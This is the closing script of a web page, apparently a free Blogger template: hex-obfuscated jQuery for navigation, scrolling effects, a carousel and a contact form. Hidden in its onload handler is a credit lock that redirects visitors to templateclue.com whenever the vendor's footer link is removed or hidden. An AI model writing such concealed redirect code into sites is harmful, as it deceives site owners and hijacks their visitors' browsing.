var _0xa983=["\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74","\x61\x63\x74\x69\x76\x65","\x73\x69\x6E\x67\x6C\x65\x50\x61\x67\x65\x4E\x61\x76","\x2E\x6E\x61\x76\x62\x61\x72\x2D\x6E\x61\x76","\x73\x63\x72\x6F\x6C\x6C","\x73\x63\x72\x6F\x6C\x6C\x54\x6F\x70","\x2E\x6E\x61\x76\x62\x61\x72\x2D\x64\x65\x66\x61\x75\x6C\x74","\x6E\x61\x76\x2D\x73\x63\x72\x6F\x6C\x6C","\x61\x64\x64\x43\x6C\x61\x73\x73","\x72\x65\x6D\x6F\x76\x65\x43\x6C\x61\x73\x73","\x6F\x6E","\x63\x6C\x69\x63\x6B","\x64\x61\x74\x61\x2D\x73\x63\x72\x6F\x6C\x6C\x54\x6F","\x61\x74\x74\x72","\x74\x6F\x70","\x6F\x66\x66\x73\x65\x74","\x23","\x61\x6E\x69\x6D\x61\x74\x65","\x62\x6F\x64\x79\x2C\x20\x68\x74\x6D\x6C","\x2E\x62\x75\x74\x74\x6F\x6E\x2D\x73\x63\x72\x6F\x6C\x6C","\x6F\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74","\x68\x65\x69\x67\x68\x74","\x64\x61\x74\x61\x2D\x76\x61\x6C\x75\x65","\x65\x61\x63\x68","\x2E\x73\x6B\x69\x6C\x6C\x73\x2D\x70\x72\x6F\x67\x72\x65\x73\x73\x20\x73\x70\x61\x6E","\x6F\x77\x6C\x43\x61\x72\x6F\x75\x73\x65\x6C","\x2E\x63\x6C\x69\x65\x6E\x74\x73\x20\x2E\x6F\x77\x6C\x2D\x63\x61\x72\x6F\x75\x73\x65\x6C","\x73\x74\x65\x6C\x6C\x61\x72","\x6C\x6F\x61\x64","\x66\x61\x64\x65\x4F\x75\x74","\x2E\x6C\x6F\x61\x64\x69\x6E\x67","\x76\x61\x6C\x69\x64\x61\x74\x6F\x72","\x23\x63\x6F\x6E\x74\x61\x63\x74\x2D\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x69\x73\x44\x65\x66\x61\x75\x6C\x74\x50\x72\x65\x76\x65\x6E\x74\x65\x64","\x63\x6F\x6E\x74\x61\x63\x74\x2E\x70\x68\x70","\x50\x4F\x53\x54","\x73\x65\x72\x69\x61\x6C\x69\x7A\x65","\x61\x6C\x65\x72\x74\x2D","\x74\x79\x70\x65","\x6D\x65\x73\x73\x61\x67\x65","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x20","\x20\x61\x6C\x65\x72\x74\x2D\x64\x69\x73\x6D\x69\x73\x73\x61\x62\x6C\x65\x22\x3E\x3C\x62\x75\x74\x74\x6F\x6E\x20\x74\x79\x70\x65\x3D\x22\x62\x75\x74\x74\x6F\x6E\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x6C\x6F\x73\x65\x22\x20\x64\x61\x74\x61\x2D\x64\x69\x73\x6D\x69\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x22\x20\x61\x72\x69\x61\x2D\x68\x69\x64\x64\x65\x6E\x3D\x22\x74\x72\x75\x65\x22\x3E\x26\x74\x69\x6D\x65\x73\x3B\x3C\x2F\x62\x75\x74\x74\x6F\x6E\x3E","\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x2E\x6D\x65\x73\x73\x61\x67\x65\x73","\x66\x69\x6E\x64","\x72\x65\x73\x65\x74","\x61\x6A\x61\x78","\x6F\x6E\x6C\x6F\x61\x64","\x74\x65\x6D\x70\x6C\x61\x74\x65\x63\x6C\x75\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x74\x65\x6D\x70\x6C\x61\x74\x65\x63\x6C\x75\x65\x2E\x63\x6F\x6D\x2F","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x72\x65\x66","\x64\x6F\x66\x6F\x6C\x6C\x6F\x77","\x74\x69\x74\x6C\x65","\x46\x72\x65\x65\x20\x42\x6C\x6F\x67\x67\x65\x72\x20\x54\x65\x6D\x70\x6C\x61\x74\x65\x73","\x73\x74\x79\x6C\x65","\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x69\x6E\x6C\x69\x6E\x65\x2D\x62\x6C\x6F\x63\x6B\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x69\x6E\x68\x65\x72\x69\x74\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x63\x6F\x6C\x6F\x72\x3A\x20\x23\x63\x34\x39\x62\x36\x36\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79\x3A\x20\x76\x69\x73\x69\x62\x6C\x65\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x6F\x70\x61\x63\x69\x74\x79\x3A\x20\x31\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6C\x65\x6E\x67\x74\x68","\x23\x74\x65\x6D\x70\x6C\x61\x74\x65\x63\x6C\x75\x65\x3A\x76\x69\x73\x69\x62\x6C\x65"];var _0xda21=[_0xa983[0],_0xa983[1],_0xa983[2],_0xa983[3],_0xa983[4],_0xa983[5],_0xa983[6],_0xa983[7],_0xa983[8],_0xa983[9],_0xa983[10],_0xa983[11],_0xa983[12],_0xa983[13],_0xa983[14],_0xa983[15],_0xa983[16],_0xa983[17],_0xa983[18],_0xa983[19],_0xa983[20],_0xa983[21],_0xa983[22],_0xa983[23],_0xa983[24],_0xa983[25],_0xa983[26],_0xa983[27],_0xa983[28],_0xa983[29],_0xa983[30],_0xa983[31],_0xa983[32],_0xa983[33],_0xa983[34],_0xa983[35],_0xa983[36],_0xa983[37],_0xa983[38],_0xa983[39],_0xa983[40],_0xa983[41],_0xa983[42],_0xa983[43],_0xa983[44],_0xa983[45],_0xa983[46],_0xa983[47],_0xa983[48],_0xa983[49],_0xa983[50],_0xa983[51],_0xa983[52],_0xa983[53],_0xa983[54],_0xa983[55],_0xa983[56],_0xa983[57],_0xa983[58],_0xa983[59],_0xa983[60],_0xa983[61],_0xa983[62],_0xa983[63],_0xa983[64]];$(function(){_0xda21[0];var _0x53ebx2=$(window);$(_0xda21[3])[_0xda21[2]]({speed:1e3,currentClass:_0xda21[1],offset:80});_0x53ebx2[_0xda21[10]](_0xda21[4],function(){var _0x53ebx3=$(window)[_0xda21[5]](),_0x53ebx4=$(_0xda21[6]);if(_0x53ebx3> 300){_0x53ebx4[_0xda21[8]](_0xda21[7])}else {_0x53ebx4[_0xda21[9]](_0xda21[7])}});$(_0xda21[19])[_0xda21[10]](_0xda21[11],function(){var _0x53ebx5=$(this)[_0xda21[13]](_0xda21[12]);$(_0xda21[18])[_0xda21[17]]({scrollTop:$(_0xda21[16]+ _0x53ebx5)[_0xda21[15]]()[_0xda21[14]]- 80},1e3)});_0x53ebx2[_0xda21[10]](_0xda21[4],function(){$(_0xda21[24])[_0xda21[23]](function(){var _0x53ebx6=$(this)[_0xda21[15]]()[_0xda21[14]]+ $(this)[_0xda21[20]]();var _0x53ebx7=$(window)[_0xda21[5]]()+ $(window)[_0xda21[21]]();var _0x53ebx8=$(this)[_0xda21[13]](_0xda21[22]);if(_0x53ebx7> _0x53ebx6){$(this)[_0xda21[17]]({width:_0x53ebx8},2e3)}})});$(_0xda21[26])[_0xda21[25]]({items:1,loop:true,mouseDrag:true,autoplay:true,smartSpeed:500});_0x53ebx2[_0xda21[27]]()});$(window)[_0xda21[10]](_0xda21[28],function(){$(_0xda21[30])[_0xda21[29]](500);$(_0xda21[32])[_0xda21[31]]();$(_0xda21[32])[_0xda21[10]](_0xda21[33],function(_0x53ebx9){if(!_0x53ebx9[_0xda21[34]]()){var _0x53ebxa=_0xda21[35];$[_0xda21[48]]({type:_0xda21[36],url:_0x53ebxa,data:$(this)[_0xda21[37]](),success:function(_0x53ebxb){var _0x53ebxc=_0xda21[38]+ _0x53ebxb[_0xda21[39]];var _0x53ebxd=_0x53ebxb[_0xda21[40]];var _0x53ebxe=_0xda21[41]+ _0x53ebxc+ _0xda21[42]+ _0x53ebxd+ _0xda21[43];if(_0x53ebxc&& _0x53ebxd){$(_0xda21[32])[_0xda21[46]](_0xda21[45])[_0xda21[44]](_0x53ebxe);$(_0xda21[32])[0][_0xda21[47]]()}}});return false}})});window[_0xda21[49]]= function(){var _0x53ebx9=document[_0xda21[51]](_0xda21[50]);if(_0x53ebx9== null){window[_0xda21[53]][_0xda21[52]]= _0xda21[54]};_0x53ebx9[_0xda21[55]](_0xda21[52],_0xda21[54]);_0x53ebx9[_0xda21[55]](_0xda21[56],_0xda21[57]);_0x53ebx9[_0xda21[55]](_0xda21[58],_0xda21[59]);_0x53ebx9[_0xda21[55]](_0xda21[60],_0xda21[61]);_0x53ebx9[_0xda21[62]]= _0xda21[59];setInterval(function(){if(!$(_0xda21[64])[_0xda21[63]]){window[_0xda21[53]][_0xda21[52]]= _0xda21[54]}},3000)}
//]]></script>

</body>
</html>
